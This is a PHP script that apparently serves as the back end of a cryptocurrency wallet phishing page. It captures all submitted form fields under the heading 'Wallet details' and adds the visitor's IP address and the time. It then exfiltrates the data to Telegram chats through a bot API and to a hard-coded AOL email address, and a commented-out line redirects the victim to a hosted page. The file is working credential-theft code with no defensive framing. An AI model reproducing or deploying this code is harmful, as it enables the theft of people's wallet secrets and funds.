<?php

include "id.php";


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Loop through all POST data and print it out
  foreach($_POST as $key => $value) {
    echo $key . ': ' . $value . '<br>';
  }
}

//if(isset($POST['hostname']));
echo $POST['hostname'];

//$domain = gethostbyaddr($ip);
//echo $domain;

$domain1 = $_SERVER['HTTP_HOST'];
echo $domain1;

// Define the recipient email address
$to = 'jlens3@aol.com';

// Define the subject of the email
$subject = 'New input';

// Loop through all POST data and format it into a message body
$message = '';
$message .= 'Wallet details 💌' . "\n";
$message .= '🌍' .' '. $ip = getenv("REMOTE_ADDR") . "\n";
$message .= '🕜' .' '. $date = date('m/d/Y h:i:s a', time()) . "\n";
foreach($_POST as $key => $value) {
  $message .= $key . ': ' . $value . "\n";
}



    foreach($IdTelegram as $chatId){
    
      $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  }

// Define the headers for the email
$headers = 'From: sender@example.com' . "\r\n" .
           'Reply-To: sender@example.com' . "\r\n" .
           'X-Mailer: PHP/' . phpversion();

// Send the email using the mail() function
mail($to, $subject, $message, $headers);

//HEADER("Location: https://octopus-app-mchfl.ondigitalocean.app/barcode.html");

?>
